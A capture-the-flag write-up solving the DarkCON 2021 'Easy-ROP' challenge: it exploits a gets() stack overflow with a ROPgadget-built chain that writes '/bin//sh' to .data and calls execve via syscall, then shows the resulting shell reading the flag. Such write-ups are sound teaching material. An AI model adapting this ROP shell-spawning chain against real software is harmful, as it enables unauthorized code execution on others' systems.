# Easy-ROP - DarkCON 2021

- Category: Pwn
- Points: 441
- Solves: 84
- Solved by: Lu191

## Description

Welcome to the world of pwn!!! This should be a good entry level warmup challenge !! Enjoy getting the shell

`kali@kali:~/# nc 65.1.92.179 49153`

```
Welcome to the darkcon pwn!!
Let us know your name:
```

## Analysis

The program just read from the stdin and then exit. As the name of the challenge suggest this seems to be an easy buffer overflow challenge, so we try to 
pass a very long string to the stdin and we see that the program crashes with a segmentation fault as we expected, so lets analyze the code and confirm this.
We analyze it with ghidra and looking at main() funtcion we confirm that there is a buffer overflow because this program use the function gets() to read from the stdin.

```
void main(void)

{
  char local_48 [64];
  
  setvbuf((FILE *)stdin,(char *)0x0,2,0);
  setvbuf((FILE *)stdout,(char *)0x0,2,0);
  setvbuf((FILE *)stderr,(char *)0x0,2,0);
  alarm(0x40);
  puts("Welcome to the darkcon pwn!!");
  printf("Let us know your name:");
  gets(local_48);
  return;
}
```

So in order to overwrite the IP (Instruction Pointer) we have first to overwrite the stack with 72 chars (64 array's length + 8 for the Frame Pointer) with junk.
Let's check the properties of the executable.

`kali@kali:~/# checksec easy-rop`

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

We don't have PIE enabled so any static ROPchain should work fine.
We see with a few tries with pwndbg that the Canary found should not be a problem because it will not be overwritten with a small ropchain.

## Solution

We try to automate the process of creation of the ropchain using a tool called ROPGadget.

`kali@kali:~/# ROPgadget --binary easy-rop --ropchain`

```
p += pack('<Q', 0x000000000040f4be) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e0) # @ .data
p += pack('<Q', 0x00000000004175eb) # pop rax ; ret
p += '/bin//sh'.encode()
p += pack('<Q', 0x0000000000481e65) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040f4be) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
p += pack('<Q', 0x0000000000446959) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000481e65) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040191a) # pop rdi ; ret
p += pack('<Q', 0x00000000004c00e0) # @ .data
p += pack('<Q', 0x000000000040f4be) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
p += pack('<Q', 0x000000000040181f) # pop rdx ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
p += pack('<Q', 0x0000000000446959) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004012d3) # syscall
```

Let's analyze the ropchain it built.
We will spawn our shell using syscall and execve which both take a few arguments, let’s look at syscall first:

`syscall(RAX, RDI, RSI, RDX)`

The RAX (Accumulator register) will hold the system call number where we will call execve (number 59 or 0x3b in hexadecimal).
The RDI (Destination Index register) argument will point to /bin/sh.
The RSI and RDX (Source Index register and Data register) are additional arguments that we will zero out.

Since PIE (Position Independent Executable) isn't enabled we know that the .data address won't change from run to run. So, this is a great place to store /bin/sh in memory. Let's check our section permissions and check our .data section address.
We use readelf to copy the address where the .data section starts.

`kali@kali:~/# readelf -t easy-rop`

```
There are 32 section headers, starting at offset 0xd4678:

Intestazioni di sezione:
[N°] Nome   Tipo      Indirizzo         Offset            Link    Dimensione       DimEnt           Info  Allin    Flag
...
[21] .data  PROGBITS  00000000004c00e0  00000000000bf0e0  0       0000000000001a30 0000000000000000  0    32       [0000000000000003]: WRITE, ALLOC
...
```

So we first set rsi with the address where the .data section starts, then we set rax that now contains the string "/bin//sh" we use two forwardslash due to padding.
Then we copy the string "/bin//sh" in memory (.data section).

```
p += pack('<Q', 0x000000000040f4be) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e0) # @ .data
p += pack('<Q', 0x00000000004175eb) # pop rax ; ret
p += '/bin//sh'.encode()
p += pack('<Q', 0x0000000000481e65) # mov qword ptr [rsi], rax ; ret
```

We write a null byte to the address where is located the .data section + 8, then we set the right values for the three registers that will be used for the syscall, now we the RDI argument will point to /bin/sh string located where the .data section start and the RSI and RDX point to the null byte located at the address of .data + 8, so they are zero out.

```
p += pack('<Q', 0x000000000040f4be) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
p += pack('<Q', 0x0000000000446959) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000481e65) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040191a) # pop rdi ; ret
p += pack('<Q', 0x00000000004c00e0) # @ .data
p += pack('<Q', 0x000000000040f4be) # pop rsi ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
p += pack('<Q', 0x000000000040181f) # pop rdx ; ret
p += pack('<Q', 0x00000000004c00e8) # @ .data + 8
```

Our final steps are to set 0x3b (execve syscall) into RAX (this is done setting first rax to 0 xoring rax with rax and then adding 1 to rax until it reaches 0x3b, so 59 times) and then invoke our syscall.

```
p += pack('<Q', 0x0000000000446959) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
...
p += pack('<Q', 0x00000000004774d0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004012d3) # syscall
```

`kali@kali:~/# python3 exploit.py`

```
[+] Opening connection to 65.1.92.179 on port 49153: Done
[*] Switching to interactive mode
$ id
uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)
$ ls
easy-rop
flag
run.sh
ynetd
$ cat flag
darkCON{w0nd3rful_m4k1n9_sh3llc0d3_us1n9_r0p!!!}
```
